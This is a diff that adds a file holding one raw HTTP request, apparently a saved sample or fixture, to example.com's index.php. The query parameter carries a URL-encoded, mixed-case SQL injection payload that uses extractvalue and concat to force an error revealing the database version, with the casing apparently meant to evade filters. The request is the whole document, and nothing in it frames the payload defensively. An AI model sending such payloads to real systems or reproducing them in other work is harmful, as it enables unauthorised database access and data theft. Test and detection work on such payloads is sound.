@@ -1,0 +1,6 @@
+GET /index.php?param=%27%20CHAR%2897%2C110%2C100%29%20extractvALue%281%2CCoNcat%280x7e%2CVeRsion%28%29%29%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
